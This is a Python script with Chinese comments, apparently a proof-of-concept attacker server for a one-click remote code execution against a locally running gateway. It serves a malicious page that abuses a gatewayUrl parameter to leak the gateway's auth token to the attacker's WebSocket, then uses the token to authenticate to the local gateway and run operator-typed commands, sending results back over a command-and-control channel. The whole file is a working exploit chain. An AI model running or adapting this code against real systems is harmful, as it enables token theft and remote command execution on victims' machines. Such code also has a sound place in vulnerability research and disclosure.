# attacker_server.py
# 放在 WSL2 中运行
# 模拟攻击者服务器：提供恶意页面 + 命令与控制WebSocket + 令牌接收

import asyncio
import websockets
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import time

ATTACKER_WS_PORT = 8765          # 命令与控制WebSocket端口
ATTACKER_HTTP_PORT = 8000        # 提供恶意页面的HTTP端口
TOKEN_RECEIVE_PORT = 8766        # 接收令牌的WebSocket端口
WSL2_IP = "172.18.6.216"         # 请修改为你的WSL2实际IP

connected_victims = set()
stolen_tokens = []               # 存储最近收到的令牌

# --- WebSocket服务1：命令与控制通道（端口8765）---
async def cmd_handler(websocket):
    global connected_victims
    print(f"[攻击者] 新的受害者命令通道建立")
    connected_victims.add(websocket)
    try:
        await websocket.send(json.dumps({"type": "ready"}))
        async for message in websocket:
            data = json.loads(message)
            if data.get('type') == 'result':
                print(f"\n[攻击者] 收到命令执行结果:\n{data.get('result')}\n")
            else:
                print(f"[攻击者] 收到未知消息: {data}")
    except websockets.ConnectionClosed:
        print("[攻击者] 受害者命令通道关闭")
    finally:
        connected_victims.remove(websocket)

async def broadcast_command(command):
    if not connected_victims:
        print("[攻击者] 当前没有受害者在线，无法发送命令")
        return
    message = json.dumps({"type": "exec", "command": command})
    for victim in connected_victims.copy():
        try:
            await victim.send(message)
        except:
            pass

async def ws_server():
    async with websockets.serve(cmd_handler, "0.0.0.0", ATTACKER_WS_PORT):
        print(f"[攻击者] 命令与控制WebSocket启动: ws://{WSL2_IP}:{ATTACKER_WS_PORT}")
        loop = asyncio.get_running_loop()
        def read_stdin():
            while True:
                cmd = input("输入要执行的命令 (例如 whoami): ")
                if cmd:
                    asyncio.run_coroutine_threadsafe(broadcast_command(cmd), loop)
        threading.Thread(target=read_stdin, daemon=True).start()
        await asyncio.Future()

# --- WebSocket服务2：接收令牌（端口8766）---
async def token_receiver(websocket):
    print("[攻击者] 新的令牌接收连接")
    try:
        async for message in websocket:
            print(f"[攻击者] 收到原始消息: {message}")
            # 提取令牌（支持文本格式 #sym:xxx 和 JSON 格式）
            token = None
            if message.startswith("#sym:"):
                token = message[5:].strip()
            else:
                try:
                    data = json.loads(message)
                    token = data.get('params', {}).get('auth', {}).get('token')
                except:
                    pass
            if token:
                stolen_tokens.append(token)
                print(f"[攻击者] 成功提取令牌: {token}")
                await websocket.send(json.dumps({"status": "ok", "message": "Token received"}))
            else:
                print("[攻击者] 消息中未找到令牌")
    except websockets.ConnectionClosed:
        print("[攻击者] 令牌接收连接关闭")

async def token_server():
    async with websockets.serve(token_receiver, "0.0.0.0", TOKEN_RECEIVE_PORT):
        print(f"[攻击者] 令牌接收WebSocket启动: ws://{WSL2_IP}:{TOKEN_RECEIVE_PORT}")
        await asyncio.Future()

# --- HTTP服务：提供恶意页面，包含按钮和动态令牌获取 ---
class EvilHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/get_token':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            token = stolen_tokens[-1] if stolen_tokens else None
            response = json.dumps({"token": token})
            self.wfile.write(response.encode())
            return

        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>恶意 PoC 页面</title>
                <style>
                    button {{ margin: 10px; padding: 10px; font-size: 16px; }}
                    #log {{ background: #f0f0f0; padding: 10px; margin-top: 20px; font-family: monospace; height: 200px; overflow-y: auto; }}
                </style>
            </head>
            <body>
                <h1>一键RCE 模拟演示</h1>
                <button id="launchBtn">Launch Exploit</button>
                <button id="cmdBtn" disabled>发送命令（需先获取令牌）</button>
                <div id="log"></div>

                <script>
                    let token = null;
                    let attackerWs = null;
                    let localWs = null;
                    let authenticated = false;

                    function appendLog(msg) {{
                        const div = document.getElementById('log');
                        div.innerHTML += `<div>${{new Date().toLocaleTimeString()}}: ${{msg}}</div>`;
                        div.scrollTop = div.scrollHeight;
                    }}

                    // 获取令牌（轮询直到获取到）
                    async function fetchToken() {{
                        appendLog("正在从攻击者服务器获取令牌...");
                        let attempts = 0;
                        const maxAttempts = 20;
                        const interval = 1000;
                        const check = setInterval(async () => {{
                            try {{
                                const resp = await fetch('/get_token');
                                const data = await resp.json();
                                if (data.token) {{
                                    token = data.token;
                                    appendLog(`成功获取令牌: ${{token}}`);
                                    clearInterval(check);
                                    document.getElementById('cmdBtn').disabled = false;
                                    connectLocalGateway();
                                }} else {{
                                    attempts++;
                                    if (attempts >= maxAttempts) {{
                                        clearInterval(check);
                                        appendLog("获取令牌超时，请确保 Launch Exploit 已成功打开并发送令牌");
                                    }}
                                }}
                            }} catch (err) {{
                                appendLog(`获取令牌失败: ${{err}}`);
                            }}
                        }}, interval);
                    }}

                    function connectLocalGateway() {{
                        if (!token) return;
                        appendLog("正在连接本地网关...");
                        localWs = new WebSocket("ws://localhost:18789");
                        localWs.onopen = () => {{
                            appendLog("已连接到本地网关，发送认证令牌...");
                            localWs.send(JSON.stringify({{
                                type: "req",
                                id: "auth-" + Math.random(),
                                method: "connect",
                                params: {{
                                    auth: {{ token: token }}
                                }}
                            }}));
                        }};
                        localWs.onmessage = (event) => {{
                            const msg = JSON.parse(event.data);
                            appendLog(`收到本地网关消息: ${{JSON.stringify(msg)}}`);
                            if (msg.type === 'res' && msg.ok === true) {{
                                authenticated = true;
                                appendLog("本地网关认证成功，等待攻击者下发命令...");
                            }} else if (msg.type === 'exec_result') {{
                                if (attackerWs && attackerWs.readyState === WebSocket.OPEN) {{
                                    attackerWs.send(JSON.stringify({{ type: "result", result: msg.result }}));
                                    appendLog(`执行结果已转发给攻击者: ${{msg.result}}`);
                                }} else {{
                                    appendLog(`执行结果: ${{msg.result}} (攻击者通道未连接)`);
                                }}
                            }}
                        }};
                        localWs.onclose = () => appendLog("本地网关连接关闭");
                        localWs.onerror = (err) => appendLog("本地网关连接错误: " + err);
                    }}

                    function connectAttacker() {{
                        attackerWs = new WebSocket("ws://{WSL2_IP}:{ATTACKER_WS_PORT}");
                        attackerWs.onopen = () => {{
                            appendLog("已连接到攻击者服务器，等待命令...");
                        }};
                        attackerWs.onmessage = (event) => {{
                            const cmd = JSON.parse(event.data);
                            if (cmd.type === 'exec' && authenticated && localWs && localWs.readyState === WebSocket.OPEN) {{
                                appendLog(`收到攻击者命令: ${{cmd.command}}`);
                                localWs.send(JSON.stringify({{
                                    type: "exec",
                                    command: cmd.command
                                }}));
                            }}
                        }};
                        attackerWs.onerror = (err) => appendLog("攻击者连接错误: " + err);
                    }}

                    // Launch Exploit 按钮：打开 token 泄露页面
                    document.getElementById('launchBtn').onclick = () => {{
                        appendLog("启动漏洞利用，打开令牌泄露页面...");
                        window.open("http://localhost:18788/chat?gatewayUrl=ws://{WSL2_IP}:{TOKEN_RECEIVE_PORT}", "_blank");
                        // 立即开始轮询获取令牌
                        fetchToken();
                    }};

                    // 命令发送按钮（可选，主要用于测试，实际命令从攻击者终端输入）
                    document.getElementById('cmdBtn').onclick = () => {{
                        if (!authenticated) {{
                            appendLog("尚未认证，无法发送命令");
                            return;
                        }}
                        const cmd = prompt("请输入要执行的命令:");
                        if (cmd && localWs && localWs.readyState === WebSocket.OPEN) {{
                            localWs.send(JSON.stringify({{
                                type: "exec",
                                command: cmd
                            }}));
                        }}
                    }};

                    // 初始化：连接攻击者通道
                    connectAttacker();
                </script>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        else:
            super().do_GET()

def run_http():
    server = HTTPServer(('', ATTACKER_HTTP_PORT), EvilHandler)
    print(f"[攻击者] HTTP恶意页面服务: http://{WSL2_IP}:{ATTACKER_HTTP_PORT}")
    server.serve_forever()

if __name__ == "__main__":
    print("="*50)
    print("   攻击者服务器启动")
    print("="*50)
    print(f"WSL2 IP: {WSL2_IP}")
    print("请确保宿主机能ping通此IP。")
    print("="*50)

    http_thread = threading.Thread(target=run_http, daemon=True)
    http_thread.start()

    loop = asyncio.new_event_loop()
    def run_ws_in_thread():
        asyncio.set_event_loop(loop)
        loop.run_until_complete(asyncio.gather(ws_server(), token_server()))
    ws_thread = threading.Thread(target=run_ws_in_thread, daemon=True)
    ws_thread.start()

    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n关闭服务...")